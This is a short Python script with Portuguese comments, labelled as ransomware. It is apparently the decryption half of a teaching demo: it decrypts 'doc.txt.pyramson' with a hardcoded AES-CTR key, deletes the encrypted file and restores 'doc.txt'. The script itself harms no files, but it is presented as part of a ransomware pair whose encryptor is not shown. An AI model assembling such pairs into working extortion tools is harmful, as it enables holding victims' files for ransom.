#RAMSOWARE

#AO EXECUTA ESTE CÓDIGO IRÁ SER FEITO O RESGATE DO ARQUIVO, DESCRIPTOGRAFIA + MAIS EXCLUSÃO DO ARQUIVO CRIPTOGRAFADO

#RESGATE DO ARQUIVO

#importar bibliotecas necessárias
import os
import pyaes

file_name = 'doc.txt.pyramson' #utiliza o arquivo que foi sequestrado
file = open(file_name, 'rb') #realizar a abertura do arquivo
file_data = file.read() #realizar a leitura do arquivo
file.close()

#utilizando a mesma chave que criptografou para descriptografar
key = b'ksjaiwyebc182756'
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data) #realizar a descriptografia do arquivo

os.remove(file_name) #REMOVE O ARQUIVO CRIPTOGRAFADO

new_file_name = 'doc.txt' #'cria-se' novamente o arquivo original
new_File = open(new_file_name, 'wb') #abre o arquivo original resgatado
new_File.write(decrypt_data) #rezliar a descriptografia do arquivo
new_File.close()